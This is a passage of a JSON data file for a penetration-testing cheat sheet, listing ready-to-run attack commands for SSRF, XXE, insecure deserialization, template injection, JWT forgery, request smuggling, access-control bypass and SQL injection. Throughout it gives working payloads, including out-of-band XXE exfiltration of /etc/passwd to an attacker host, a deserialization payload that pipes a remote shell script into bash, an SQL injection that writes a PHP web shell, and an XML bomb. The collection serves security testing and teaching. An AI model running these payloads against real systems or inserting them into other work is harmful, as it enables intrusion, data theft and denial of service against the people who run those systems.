            "title": "SSRF GCP Metadata",
            "desc": "Access Google Cloud metadata endpoint",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://metadata.google.internal/computeMetadata/v1/'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SSRF Internal Port Scan",
            "desc": "Scan internal ports via SSRF",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://127.0.0.1:<PORT>/'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSRF File Protocol",
            "desc": "Read local files via file:// protocol",
            "cmd": "curl 'http://<TARGET_IP>/page?url=file:///etc/passwd'",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "XML External Entity Injection",
        "commands": [
          {
            "title": "XXE File Read (Linux)",
            "desc": "Read local file via XXE",
            "cmd": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>' http://<TARGET_IP>/api",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "XXE File Read (Windows)",
            "desc": "Read local file on Windows target",
            "cmd": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>' http://<TARGET_IP>/api",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "XXE SSRF",
            "desc": "Server-Side Request Forgery via XXE",
            "cmd": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80/\">]><root>&xxe;</root>' http://<TARGET_IP>/api",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "XXE PHP Base64 Wrapper",
            "desc": "Read PHP source via XXE with base64 encoding",
            "cmd": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><root>&xxe;</root>' http://<TARGET_IP>/api",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XXE OOB Exfiltration",
            "desc": "Out-of-band data exfiltration via XXE",
            "cmd": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://<ATTACKER_IP>/xxe.dtd\">%xxe;]><root>test</root>' http://<TARGET_IP>/api",
            "tags": [
              "advanced"
            ],
            "note": "xxe.dtd: <!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://<ATTACKER_IP>/?data=%file;\">'>%eval;%exfil;"
          },
          {
            "title": "XXE Billion Laughs (DoS)",
            "desc": "XML bomb for denial of service testing",
            "cmd": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><root>&lol2;</root>' http://<TARGET_IP>/api",
            "tags": [
              "advanced"
            ],
            "note": "Use with caution - can crash services"
          },
          {
            "title": "Blind XXE with OOB DTD",
            "desc": "Exfiltrate data via out-of-band external DTD",
            "cmds": [
              "# Host this as xxe.dtd on attacker:",
              "# <!ENTITY % file SYSTEM 'file:///etc/hostname'>",
              "# <!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://<ATTACKER_IP>/?d=%file;\">'>",
              "# %eval; %exfil;",
              "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://<ATTACKER_IP>/xxe.dtd\">%xxe;]><root>test</root>' http://<TARGET_IP>/api"
            ],
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Blind XXE Error-Based",
            "desc": "Exfiltrate data through XML parsing errors",
            "cmd": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/hostname\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM \\\"file:///nonexistent/%file;\\\">\">%eval;%error;]><root>test</root>' http://<TARGET_IP>/api",
            "tags": [
              "advanced"
            ],
            "note": "Data appears in error message"
          },
          {
            "title": "XXE via SVG Upload",
            "desc": "XXE through SVG file upload",
            "cmd": "echo '<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>' > xxe.svg",
            "tags": [
              "advanced"
            ],
            "note": "Upload SVG to endpoints that process XML-based images"
          },
          {
            "title": "XXE via DOCX/XLSX",
            "desc": "Inject XXE into Office Open XML files",
            "cmds": [
              "unzip document.docx -d xxe_doc",
              "# Edit xxe_doc/[Content_Types].xml or word/document.xml to add DOCTYPE with ENTITY",
              "cd xxe_doc && zip -r ../evil.docx ."
            ],
            "tags": [
              "advanced"
            ],
            "note": "DOCX/XLSX are ZIP archives containing XML files"
          },
          {
            "title": "XXE via SOAP Request",
            "desc": "XXE injection in SOAP web service",
            "cmd": "curl -X POST -H 'Content-Type: text/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>' http://<TARGET_IP>/ws",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XInclude Attack",
            "desc": "XXE alternative when you cannot control DOCTYPE",
            "cmd": "curl -X POST -d '<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>' http://<TARGET_IP>/api",
            "tags": [
              "advanced"
            ],
            "note": "Works when input is embedded into server-side XML"
          }
        ]
      },
      {
        "name": "Insecure Deserialization",
        "commands": [
          {
            "title": "Ysoserial Java Payload (CommonsCollections1)",
            "desc": "Generate Java deserialization payload",
            "cmd": "java -jar ysoserial.jar CommonsCollections1 'ping -c 1 <ATTACKER_IP>' | base64 -w 0",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Ysoserial Java Payload (CommonsCollections5)",
            "desc": "Generate CC5 gadget chain payload",
            "cmd": "java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,<BASE64_REVSHELL>}|{base64,-d}|bash' | base64 -w 0",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Ysoserial Java Payload (CommonsCollections7)",
            "desc": "Generate CC7 gadget chain payload",
            "cmd": "java -jar ysoserial.jar CommonsCollections7 'curl http://<ATTACKER_IP>/shell.sh|bash' | base64 -w 0",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "PHP Deserialization Payload",
            "desc": "Craft PHP serialized object for injection",
            "cmd": "php -r 'echo serialize(new stdClass());'",
            "tags": [
              "advanced"
            ],
            "note": "Customize object with magic methods __wakeup() or __destruct() based on target class"
          },
          {
            "title": "Python Pickle RCE",
            "desc": "Generate malicious Python pickle payload",
            "cmd": "python3 -c \"import pickle,os,base64; class P(object):\\n def __reduce__(self):\\n  return (os.system,('id',))\\nprint(base64.b64encode(pickle.dumps(P())).decode())\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": ".NET Ysoserial Payload",
            "desc": "Generate .NET deserialization payload",
            "cmd": "ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c 'ping <ATTACKER_IP>' -o base64",
            "tags": [
              "tool"
            ],
            "note": "Windows tool for .NET targets"
          }
        ]
      },
      {
        "name": "Template Injection (SSTI)",
        "commands": [
          {
            "title": "SSTI Detection",
            "desc": "Test for template injection with arithmetic",
            "cmd": "curl 'http://<TARGET_IP>/page?name={{7*7}}'",
            "tags": [
              "essential"
            ],
            "note": "If output shows 49, SSTI is confirmed"
          },
          {
            "title": "SSTI Jinja2 Detection",
            "desc": "Confirm Jinja2 template engine",
            "cmd": "curl 'http://<TARGET_IP>/page?name={{7*\"7\"}}'",
            "tags": [
              "essential"
            ],
            "note": "Jinja2 returns 7777777, Twig returns 49"
          },
          {
            "title": "SSTI Jinja2 Config Dump",
            "desc": "Dump Flask/Jinja2 configuration",
            "cmd": "curl 'http://<TARGET_IP>/page?name={{config}}'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSTI Jinja2 RCE (Python3)",
            "desc": "Remote code execution via Jinja2",
            "cmd": "curl \"http://<TARGET_IP>/page?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSTI Jinja2 RCE (MRO Chain)",
            "desc": "RCE via MRO class traversal",
            "cmd": "curl \"http://<TARGET_IP>/page?name={{''.__class__.__mro__[1].__subclasses__()[<INDEX>]('id',shell=True,stdout=-1).communicate()}}\"",
            "tags": [
              "advanced"
            ],
            "note": "Find subprocess.Popen index with: {{''.__class__.__mro__[1].__subclasses__()}}"
          },
          {
            "title": "SSTI Twig RCE",
            "desc": "Remote code execution via Twig (PHP)",
            "cmd": "curl 'http://<TARGET_IP>/page?name={{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SSTI Freemarker RCE",
            "desc": "Remote code execution via Freemarker (Java)",
            "cmd": "curl 'http://<TARGET_IP>/page?name=<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SSTI ERB Ruby",
            "desc": "Code execution via ERB templates",
            "cmd": "curl 'http://<TARGET_IP>/page?name=<%25%3d+system(\"id\")+%25>'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SSTI Identify Engine",
            "desc": "Polyglot payload to identify template engine",
            "cmd": "curl 'http://<TARGET_IP>/page?name=${{<%25[%25'\"}}%25>.'",
            "tags": [
              "essential"
            ],
            "note": "Check error messages to identify template engine"
          },
          {
            "title": "SSTI Jinja2 Class Traversal",
            "desc": "Access classes via MRO for RCE",
            "cmd": "curl \"http://<TARGET_IP>/page?name={{''.__class__.__mro__[1].__subclasses__()}}\"",
            "tags": [
              "essential"
            ],
            "note": "Find subprocess.Popen index then use it for command execution"
          },
          {
            "title": "SSTI Jinja2 Lipsum RCE",
            "desc": "RCE via lipsum global in Jinja2",
            "cmd": "curl \"http://<TARGET_IP>/page?name={{lipsum.__globals__['os'].popen('id').read()}}\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SSTI Jinja2 cycler RCE",
            "desc": "RCE via cycler object in Jinja2",
            "cmd": "curl \"http://<TARGET_IP>/page?name={{cycler.__init__.__globals__.os.popen('id').read()}}\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SSTI Jinja2 Dump SECRET_KEY",
            "desc": "Extract Flask secret key via config",
            "cmd": "curl 'http://<TARGET_IP>/page?name={{config.SECRET_KEY}}'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSTI Twig Detection",
            "desc": "Test for Twig template engine (PHP)",
            "cmd": "curl 'http://<TARGET_IP>/page?name={{7*7}}'",
            "tags": [
              "essential"
            ],
            "note": "Twig returns 49 for {{7*7}}"
          },
          {
            "title": "SSTI Freemarker Detection",
            "desc": "Detect Freemarker via assign",
            "cmd": "curl 'http://<TARGET_IP>/page?name=${7*7}'",
            "tags": [
              "essential"
            ],
            "note": "Freemarker uses ${} syntax"
          },
          {
            "title": "SSTI Mako RCE (Python)",
            "desc": "RCE via Mako template engine",
            "cmd": "curl \"http://<TARGET_IP>/page?name=<%25import os;x=os.popen('id').read()%25>${x}\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SSTI Handlebars RCE",
            "desc": "RCE via Handlebars template (Node.js)",
            "cmd": "curl \"http://<TARGET_IP>/page?name={{#with 'constructor' as |a|}}{{#with (lookup . a)}}{{this ('return require(\\\"child_process\\\").execSync(\\\"id\\\")')()}}{{/with}}{{/with}}\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SSTI Detect — {{7*7}}",
            "desc": "Basic SSTI detection",
            "cmd": "{{7*7}}",
            "tags": [
              "essential"
            ],
            "note": "If output is 49, template injection exists"
          },
          {
            "title": "SSTI Jinja2 — Config",
            "desc": "Access Flask config",
            "cmd": "{{config}}",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSTI Jinja2 — RCE lipsum",
            "desc": "RCE via lipsum globals",
            "cmd": "{{lipsum.__globals__['os'].popen('id').read()}}",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSTI Jinja2 — RCE cycler",
            "desc": "RCE via cycler",
            "cmd": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SSTI Mako RCE",
            "desc": "RCE in Mako",
            "cmd": "${__import__('os').popen('id').read()}",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SSTI Detection Polyglot",
            "desc": "Universal detection string",
            "cmd": "${{<%[%'\"}}%\\",
            "tags": [
              "essential"
            ],
            "note": "If output changes, SSTI likely"
          }
        ]
      },
      {
        "name": "JWT Attacks",
        "commands": [
          {
            "title": "JWT Decode (Manual)",
            "desc": "Decode JWT token parts manually",
            "cmd": "echo '<JWT_TOKEN>' | cut -d. -f2 | base64 -d 2>/dev/null | jq .",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "JWT None Algorithm Attack",
            "desc": "Forge JWT with alg:none to bypass signature",
            "cmds": [
              "# Change header to {\"alg\":\"none\",\"typ\":\"JWT\"}",
              "# Remove the signature (third part after second dot)",
              "# Send: header.payload."
            ],
            "tags": [
              "essential"
            ],
            "note": "Works if server doesn't validate algorithm"
          },
          {
            "title": "JWT Weak Secret Crack (Hashcat)",
            "desc": "Crack JWT HMAC secret with hashcat",
            "cmd": "hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "JWT Weak Secret Crack (john)",
            "desc": "Crack JWT HMAC secret with john",
            "cmd": "john jwt_token.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "JWT Algorithm Confusion (RS256 to HS256)",
            "desc": "Switch RS256 to HS256 and sign with public key",
            "cmds": [
              "# 1. Get the server's public key",
              "# 2. Change alg from RS256 to HS256",
              "# 3. Sign the JWT using the public key as HMAC secret",
              "python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem"
            ],
            "tags": [
              "advanced"
            ],
            "note": "Works if server uses same key variable for both algorithms"
          },
          {
            "title": "JWT Tool Full Scan",
            "desc": "Automated JWT vulnerability scanning",
            "cmd": "python3 jwt_tool.py <JWT_TOKEN> -M at -t 'http://<TARGET_IP>/api/protected' -rh 'Authorization: Bearer'",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "JWT KID Injection",
            "desc": "Exploit kid header parameter for key injection",
            "cmd": "python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv '../../../../../../dev/null' -S hs256 -p ''",
            "tags": [
              "advanced"
            ],
            "note": "kid parameter may be used to read arbitrary files as signing key"
          },
          {
            "title": "JWT Decode",
            "desc": "Decode JWT token",
            "cmd": "python3 jwt_tool.py <JWT_TOKEN>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "JWT None Algorithm",
            "desc": "Bypass with none alg",
            "cmd": "python3 jwt_tool.py <JWT_TOKEN> -X a",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "JWT Crack Secret",
            "desc": "Brute force HMAC secret",
            "cmds": [
              "python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt",
              "hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "JWT Algorithm Confusion",
            "desc": "RS256 to HS256 attack",
            "cmd": "python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem",
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "CORS & HTTP Smuggling",
        "commands": [
          {
            "title": "CORS Misconfiguration Test",
            "desc": "Test if origin is reflected in CORS headers",
            "cmd": "curl -s -I -H 'Origin: https://evil.com' http://<TARGET_IP>/ | grep -i 'Access-Control-Allow'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "CORS Null Origin Test",
            "desc": "Test if null origin is allowed",
            "cmd": "curl -s -I -H 'Origin: null' http://<TARGET_IP>/ | grep -i 'Access-Control-Allow'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "CORS Wildcard Check",
            "desc": "Check if CORS allows all origins with credentials",
            "cmd": "curl -s -I -H 'Origin: https://evil.com' http://<TARGET_IP>/api/ | grep -E 'Access-Control-Allow-(Origin|Credentials)'",
            "tags": [
              "essential"
            ],
            "note": "Vulnerable if Origin is reflected AND credentials: true"
          },
          {
            "title": "HTTP Request Smuggling CL.TE",
            "desc": "CL.TE smuggling test payload",
            "cmd": "printf 'POST / HTTP/1.1\\r\\nHost: <TARGET_IP>\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nX' | nc <TARGET_IP> 80",
            "tags": [
              "advanced"
            ],
            "note": "Front-end uses Content-Length, back-end uses Transfer-Encoding"
          },
          {
            "title": "HTTP Request Smuggling TE.CL",
            "desc": "TE.CL smuggling test payload",
            "cmd": "printf 'POST / HTTP/1.1\\r\\nHost: <TARGET_IP>\\r\\nContent-Length: 3\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nX\\r\\n0\\r\\n\\r\\n' | nc <TARGET_IP> 80",
            "tags": [
              "advanced"
            ],
            "note": "Front-end uses Transfer-Encoding, back-end uses Content-Length"
          },
          {
            "title": "Smuggler Scanner",
            "desc": "Automated HTTP request smuggling detection",
            "cmd": "python3 smuggler.py -u http://<TARGET_IP>/",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "WebSocket Connection Test",
            "desc": "Connect to a WebSocket endpoint",
            "cmd": "websocat ws://<TARGET_IP>:<PORT>/ws",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "WebSocket XSS via Message",
            "desc": "Send XSS payload through WebSocket",
            "cmd": "websocat ws://<TARGET_IP>:<PORT>/ws <<< '<script>alert(1)</script>'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "WebSocket SQLi via Message",
            "desc": "Send SQLi payload through WebSocket",
            "cmd": "websocat ws://<TARGET_IP>:<PORT>/ws <<< '{\"id\": \"1 OR 1=1-- -\"}'",
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "403 Bypass Techniques",
        "commands": [
          {
            "title": "403 Bypass — X-Original-URL",
            "desc": "Bypass via header",
            "cmd": "curl -H 'X-Original-URL: /admin' http://<TARGET_IP>/",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "403 Bypass — X-Rewrite-URL",
            "desc": "Bypass via rewrite header",
            "cmd": "curl -H 'X-Rewrite-URL: /admin' http://<TARGET_IP>/",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "403 Bypass — Path Tricks",
            "desc": "Path normalization bypass",
            "cmds": [
              "curl http://<TARGET_IP>/admin..;/",
              "curl http://<TARGET_IP>/%2e/admin",
              "curl http://<TARGET_IP>//admin//",
              "curl http://<TARGET_IP>/./admin/./",
              "curl http://<TARGET_IP>/admin%20",
              "curl http://<TARGET_IP>/admin%09"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "403 Bypass — IP Spoofing",
            "desc": "Spoof internal IP via headers",
            "cmds": [
              "curl -H 'X-Forwarded-For: 127.0.0.1' http://<TARGET_IP>/admin",
              "curl -H 'X-Real-IP: 127.0.0.1' http://<TARGET_IP>/admin",
              "curl -H 'X-Custom-IP-Authorization: 127.0.0.1' http://<TARGET_IP>/admin"
            ],
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "GraphQL Attacks",
        "commands": [
          {
            "title": "GraphQL Introspection",
            "desc": "Dump entire schema",
            "cmd": "curl -s -X POST http://<TARGET_IP>/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name,fields{name}}}}\"}' | jq",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "GraphQL Queries List",
            "desc": "List available queries",
            "cmd": "curl -s -X POST http://<TARGET_IP>/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{queryType{fields{name description}}}}\"}' | jq",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Open Redirect & CRLF",
        "commands": [
          {
            "title": "Open Redirect Payloads",
            "desc": "Common redirect payloads",
            "cmds": [
              "http://<TARGET_IP>/redirect?url=http://evil.com",
              "http://<TARGET_IP>/redirect?url=//evil.com",
              "http://<TARGET_IP>/redirect?url=\\/\\/evil.com"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "CRLF Injection",
            "desc": "Inject headers via CRLF",
            "cmds": [
              "curl 'http://<TARGET_IP>/page?param=value%0d%0aInjected-Header:true'",
              "curl 'http://<TARGET_IP>/page?param=value%0d%0a%0d%0a<script>alert(1)</script>'"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Host Header Injection",
            "desc": "Test Host header poisoning",
            "cmds": [
              "curl -H 'Host: evil.com' http://<TARGET_IP>/",
              "curl -H 'X-Forwarded-Host: evil.com' http://<TARGET_IP>/reset-password"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "HTTP Verb Tampering",
            "desc": "Test access with different methods",
            "cmds": [
              "curl -X PUT http://<TARGET_IP>/admin",
              "curl -X DELETE http://<TARGET_IP>/admin",
              "curl -X PATCH http://<TARGET_IP>/admin"
            ],
            "tags": [
              "essential"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "sqli",
    "name": "Database Exploitation via Injection",
    "icon": "🗃️",
    "description": "Detect and exploit SQL injection vulnerabilities to extract data, escalate privileges, and achieve remote code execution across major database platforms.",
    "subcategories": [
      {
        "name": "Injection Detection",
        "commands": [
          {
            "title": "SQLi Single Quote Test",
            "desc": "Test for SQL injection with single quote",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1'\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SQLi Double Quote Test",
            "desc": "Test for SQL injection with double quote",
            "cmd": "curl 'http://<TARGET_IP>/page?id=1\"'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SQLi OR True Test",
            "desc": "Boolean test — always true condition",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' OR '1'='1\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SQLi OR False Test",
            "desc": "Boolean test — always false condition",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' OR '1'='2\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SQLi AND True Test",
            "desc": "Boolean test — AND always true",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND '1'='1\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SQLi AND False Test",
            "desc": "Boolean test — AND always false",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND '1'='2\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SQLi Comment Test",
            "desc": "Test with comment to strip remainder of query",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1'-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SQLi Time-Based Detection",
            "desc": "Detect blind SQLi via time delay",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND SLEEP(5)-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SQLi Stacked Query Test",
            "desc": "Test for stacked query support",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1'; SELECT 1-- -\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SQLi ORDER BY Column Count",
            "desc": "Determine number of columns via ORDER BY",
            "cmds": [
              "curl \"http://<TARGET_IP>/page?id=1' ORDER BY 1-- -\"",
              "curl \"http://<TARGET_IP>/page?id=1' ORDER BY 2-- -\"",
              "curl \"http://<TARGET_IP>/page?id=1' ORDER BY 3-- -\""
            ],
            "tags": [
              "essential"
            ],
            "note": "Increment until error — last success = column count"
          }
        ]
      },
      {
        "name": "UNION Extraction",
        "commands": [
          {
            "title": "UNION Column Detection",
            "desc": "Find number of columns and visible positions",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,2,3-- -\"",
            "tags": [
              "essential"
            ],
            "note": "Adjust number of columns to match ORDER BY result"
          },
          {
            "title": "MySQL Version via UNION",
            "desc": "Extract MySQL version",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,@@version,3-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MySQL Current User via UNION",
            "desc": "Extract current database user",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,user(),3-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MySQL Current Database",
            "desc": "Extract current database name",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,database(),3-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MySQL List Databases",
            "desc": "Enumerate all databases",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MySQL List Tables",
            "desc": "Enumerate tables in a database",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='<DATABASE>'-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MySQL List Columns",
            "desc": "Enumerate columns in a table",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='<TABLE>'-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MySQL Dump Data",
            "desc": "Extract data from specific columns",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(<COL1>,0x3a,<COL2>),3 FROM <DATABASE>.<TABLE>-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MySQL Read File",
            "desc": "Read file from filesystem via SQL",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "MySQL Write File",
            "desc": "Write a web shell via SQL injection",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "MSSQL Version via UNION",
            "desc": "Extract MSSQL version",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,@@version,3-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MSSQL List Databases",
            "desc": "Enumerate MSSQL databases",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,name,3 FROM master.dbo.sysdatabases-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MSSQL List Tables",
            "desc": "Enumerate MSSQL tables",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,name,3 FROM <DATABASE>.dbo.sysobjects WHERE xtype='U'-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PostgreSQL Version via UNION",
            "desc": "Extract PostgreSQL version",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT NULL,version(),NULL-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PostgreSQL List Databases",
            "desc": "Enumerate PostgreSQL databases",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT NULL,datname,NULL FROM pg_database-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PostgreSQL List Tables",
            "desc": "Enumerate PostgreSQL tables",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SQLite Version via UNION",
            "desc": "Extract SQLite version",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,sqlite_version(),3-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SQLite List Tables",
            "desc": "Enumerate SQLite tables",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SQLite Table Schema",
            "desc": "Get table DDL/schema",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='<TABLE>'-- -\"",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Error-Based Extraction",
        "commands": [
          {
            "title": "MySQL ExtractValue Error",
            "desc": "Extract data via XML extractvalue error",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))-- -\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "MySQL UpdateXML Error",
            "desc": "Extract data via XML updatexml error",
